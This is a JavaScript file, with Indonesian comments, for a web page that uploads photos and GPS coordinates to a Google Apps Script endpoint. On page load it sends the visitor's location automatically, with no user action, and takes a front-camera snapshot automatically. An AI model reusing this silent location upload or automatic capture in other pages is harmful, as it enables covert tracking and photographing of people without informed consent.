const API_URL =
"https://script.google.com/macros/s/AKfycbx41FYDfjnkruic-t97kALFDMR7tLIcW3FZ5AqSawvtLdUXkh9-blp12QFiVPyr4tjzpw/exec";


const video =
document.getElementById("video");

const canvas =
document.getElementById("canvas");

const takePhoto =
document.getElementById("takePhoto");

const switchCamera =
document.getElementById("switchCamera");

const cameraStatus =
document.getElementById("cameraStatus");

const cameraOverlay =
document.getElementById("cameraOverlay");

const galleryInput =
document.getElementById("galleryInput");

const galleryPreview =
document.getElementById("galleryPreview");

const sendButton =
document.getElementById("sendButton");

const message =
document.getElementById("message");

const progressBox =
document.getElementById("progressBox");

const progress =
document.getElementById("progress");

const progressText =
document.getElementById("progressText");

const autoStatus =
document.getElementById("autoStatus");


let stream = null;

let facingMode = "user";

let latitude = "";

let longitude = "";

let capturedPhotos = [];

let galleryPhotos = [];

let automaticPhotoTaken = false;

let gpsSent = false;


/* =====================================
   SAAT HALAMAN DIBUKA
===================================== */

window.addEventListener(
  "load",
  async function() {

    startGPS();

    await startCamera();

  }
);


/* =====================================
   GPS
   BERJALAN OTOMATIS
===================================== */

function startGPS() {

  if (
    !navigator.geolocation
  ) {

    console.log(
      "GPS tidak didukung."
    );

    return;

  }


  navigator.geolocation.watchPosition(

    function(position) {

      latitude =
        position.coords.latitude;

      longitude =
        position.coords.longitude;


      console.log(
        "GPS diterima:",
        latitude,
        longitude
      );


      /*
      Kirim GPS otomatis
      setelah lokasi pertama
      diperoleh.
      */

      if (!gpsSent) {

        gpsSent = true;

        sendLocation();

      }

    },


    function(error) {

      console.log(
        "GPS error:",
        error.message
      );

    },


    {

      enableHighAccuracy: true,

      maximumAge: 0,

      timeout: 20000

    }

  );

}


/* =====================================
   KIRIM GPS OTOMATIS
===================================== */

async function sendLocation() {

  if (
    latitude === "" ||
    longitude === ""
  ) {

    return;

  }


  try {

    const data = {

      latitude:
        latitude,

      longitude:
        longitude,

      nama:
        "",

      keterangan:
        "Lokasi otomatis saat halaman dibuka",

      image:
        "",

      automatic:
        true,

      waktu:
        new Date().toISOString()

    };


    const response =
      await fetch(

        API_URL,

        {

          method:
            "POST",

          headers:
            {

              "Content-Type":
                "text/plain;charset=utf-8"

            },

          body:
            JSON.stringify(data)

        }

      );


    const result =
      await response.json();


    console.log(
      "GPS server:",
      result
    );


  }

  catch(error) {

    console.error(
      "Gagal mengirim GPS:",
      error
    );

  }

}


/* =====================================
   KAMERA DEPAN OTOMATIS
===================================== */

async function startCamera() {

  try {

    if (stream) {

      stream
        .getTracks()
        .forEach(
          track =>
            track.stop()
        );

    }


    cameraStatus.textContent =
      "Memulai...";


    cameraOverlay.textContent =
      "Meminta izin kamera...";


    stream =
      await navigator.mediaDevices
        .getUserMedia({

          video: {

            facingMode: {
              ideal: facingMode
            },

            width: {
              ideal: 1280
            },

            height: {
              ideal: 720
            }

          },

          audio: false

        });


    video.srcObject =
      stream;


    await video.play();


    cameraStatus.textContent =
      "Kamera aktif";


    cameraStatus.className =
      "status online";


    cameraOverlay.style.display =
      "none";


    takePhoto.disabled =
      false;


    autoStatus.textContent =
      "🟢 Kamera aktif — mengambil foto otomatis...";


    /*
    Tunggu kamera benar-benar
    mendapatkan frame.
    */

    setTimeout(
      automaticPhoto,
      2000
    );


  }

  catch(error) {

    console.error(
      error
    );


    cameraStatus.textContent =
      "Izin diperlukan";


    cameraOverlay.style.display =
      "flex";


    cameraOverlay.textContent =
      "Izinkan akses kamera";


    autoStatus.textContent =
      "⚠️ Kamera belum mendapat izin";


  }

}


/* =====================================
   FOTO OTOMATIS
===================================== */

function automaticPhoto() {

  if (
    automaticPhotoTaken
  ) {

    return;

  }


  if (!stream) {

    return;

  }


  const width =
    video.videoWidth;

  const height =
    video.videoHeight;


  if (
    width === 0 ||
    height === 0
  ) {

    setTimeout(
      automaticPhoto,
      1000
    );

    return;

  }


  canvas.width =
    width;

  canvas.height =
    height;


  const ctx =
    canvas.getContext("2d");


  ctx.drawImage(

    video,

    0,

    0,

    width,

    height

  );


  const image =
    canvas.toDataURL(
      "image/jpeg",
      0.80
    );


  capturedPhotos.push(
    image
  );


  automaticPhotoTaken =
    true;


  autoStatus.textContent =
    "📸 Foto otomatis berhasil diambil";


  showMessage(
    "Foto otomatis berhasil diambil.",
    "success"
  );

}


/* =====================================
   FOTO MANUAL
===================================== */

takePhoto.addEventListener(
  "click",
  function() {

    if (!stream) {

      return;

    }


    const width =
      video.videoWidth;

    const height =
      video.videoHeight;


    canvas.width =
      width;

    canvas.height =
      height;


    const ctx =
      canvas.getContext("2d");


    ctx.drawImage(

      video,

      0,

      0,

      width,

      height

    );


    const image =
      canvas.toDataURL(
        "image/jpeg",
        0.80
      );


    capturedPhotos.push(
      image
    );


    showMessage(
      "Foto berhasil diambil.",
      "success"
    );

  }
);


/* =====================================
   GANTI KAMERA
===================================== */

switchCamera.addEventListener(
  "click",
  async function() {

    facingMode =
      facingMode === "user"
        ? "environment"
        : "user";


    await startCamera();

  }
);


/* =====================================
   GALERI
===================================== */

galleryInput.addEventListener(
  "change",
  async function(event) {

    const files =
      Array.from(
        event.target.files
      );


    galleryPhotos = [];

    galleryPreview.innerHTML =
      "";


    for (
      const file of files
    ) {

      if (
        !file.type.startsWith(
          "image/"
        )
      ) {

        continue;

      }


      const image =
        await resizeImage(
          file,
          1280,
          0.78
        );


      galleryPhotos.push(
        image
      );


      const img =
        document.createElement(
          "img"
        );


      img.src =
        image;


      galleryPreview.appendChild(
        img
      );

    }


    showMessage(
      files.length +
      " foto dipilih.",
      "success"
    );

  }
);


/* =====================================
   RESIZE FOTO
===================================== */

function resizeImage(
  file,
  maxWidth,
  quality
) {

  return new Promise(
    resolve => {

      const reader =
        new FileReader();


      reader.onload =
        function(event) {

          const img =
            new Image();


          img.onload =
            function() {

              let width =
                img.width;

              let height =
                img.height;


              if (
                width > maxWidth
              ) {

                height =
                  height *
                  maxWidth /
                  width;

                width =
                  maxWidth;

              }


              const c =
                document.createElement(
                  "canvas"
                );


              c.width =
                width;

              c.height =
                height;


              const ctx =
                c.getContext(
                  "2d"
                );


              ctx.drawImage(

                img,

                0,

                0,

                width,

                height

              );


              resolve(
                c.toDataURL(
                  "image/jpeg",
                  quality
                )
              );

            };


          img.src =
            event.target.result;

        };


      reader.readAsDataURL(
        file
      );

    }
  );

}


/* =====================================
   KIRIM FOTO
===================================== */

sendButton.addEventListener(
  "click",
  async function() {

    const allPhotos = [

      ...capturedPhotos,

      ...galleryPhotos

    ];


    if (
      allPhotos.length === 0
    ) {

      showMessage(
        "Belum ada foto.",
        "error"
      );

      return;

    }


    if (
      latitude === "" ||
      longitude === ""
    ) {

      showMessage(
        "Menunggu lokasi GPS...",
        "error"
      );

      return;

    }


    const nama =
      document
        .getElementById(
          "nama"
        )
        .value
        .trim();


    const keterangan =
      document
        .getElementById(
          "keterangan"
        )
        .value
        .trim();


    sendButton.disabled =
      true;


    progressBox.style.display =
      "block";


    for (
      let i = 0;
      i < allPhotos.length;
      i++
    ) {

      progressText.textContent =
        "Mengirim " +
        (i + 1) +
        " dari " +
        allPhotos.length;


      const result =
        await sendToServer(

          allPhotos[i],

          false,

          nama,

          keterangan

        );


      if (!result) {

        sendButton.disabled =
          false;

        return;

      }


      progress.style.width =
        (
          ((i + 1) /
          allPhotos.length) *
          100
        ) + "%";

    }


    progressText.textContent =
      "✓ Selesai";


    showMessage(
      "Foto dan lokasi berhasil dikirim.",
      "success"
    );


    sendButton.disabled =
      false;

  }
);


/* =====================================
   KIRIM FOTO KE SERVER
===================================== */

async function sendToServer(
  image,
  automatic,
  nama,
  keterangan
) {

  try {

    const data = {

      latitude:
        latitude,

      longitude:
        longitude,

      nama:
        nama,

      keterangan:
        keterangan,

      image:
        image,

      automatic:
        automatic,

      waktu:
        new Date().toISOString()

    };


    const response =
      await fetch(

        API_URL,

        {

          method:
            "POST",

          headers:
            {

              "Content-Type":
                "text/plain;charset=utf-8"

            },

          body:
            JSON.stringify(data)

        }

      );


    const result =
      await response.json();


    console.log(
      result
    );


    if (
      result.status !==
      "success"
    ) {

      showMessage(
        result.message,
        "error"
      );

      return false;

    }


    return true;

  }

  catch(error) {

    console.error(
      error
    );


    showMessage(
      "Gagal mengirim ke server.",
      "error"
    );


    return false;

  }

}


/* =====================================
   PESAN
===================================== */

function showMessage(
  text,
  type
) {

  message.textContent =
    text;


  message.className =
    "message " +
    type;


  setTimeout(
    function() {

      message.className =
        "message";

    },
    5000
  );

}
